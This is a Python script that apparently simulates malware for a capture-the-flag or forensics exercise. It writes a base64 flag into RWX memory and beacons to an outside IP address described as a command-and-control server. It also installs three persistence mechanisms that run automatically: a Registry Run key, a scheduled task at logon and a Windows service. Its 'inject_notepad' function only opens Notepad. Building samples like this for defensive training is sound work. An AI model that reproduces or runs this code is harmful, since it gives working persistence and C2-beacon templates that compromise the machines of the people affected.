import os
import time
import base64
import subprocess
import socket
import ctypes

# ?? Simulated flag
flag = "flag{Y0u_C4ughT_M3!}"
encoded_flag = base64.b64encode(flag.encode()).decode()

# ?? Inject flag into memory
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
addr = ctypes.windll.kernel32.VirtualAlloc(None, len(encoded_flag), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(addr, encoded_flag.encode(), len(encoded_flag))

# ?? Fake C2 Connection
def connect_c2():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("185.231.71.52", 8080))
        s.send(b"Hello C2")
        s.close()
    except:
        pass

# ?? Persistence Mechanisms
def setup_persistence():
    exe_path = os.path.realpath(__file__)
    
    # 1. Registry Run Key
    reg_cmd = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MalwareDemo /d "{exe_path}" /f'
    subprocess.call(reg_cmd, shell=True)

    # 2. Scheduled Task
    sch_task = f'schtasks /Create /SC ONLOGON /TN MalwareSim /TR "{exe_path}" /F'
    subprocess.call(sch_task, shell=True)

    # 3. Windows Service (if admin)
    svc_name = "MalwareService"
    create_service = f'sc create {svc_name} binPath= "{exe_path}" start= auto'
    subprocess.call(create_service, shell=True)

# ?? Code Injection (Notepad)
def inject_notepad():
    subprocess.Popen(["notepad.exe"])
    time.sleep(2)  # Give it time to load

setup_persistence()
inject_notepad()
connect_c2()

# Keep alive
while True:
    time.sleep(60)
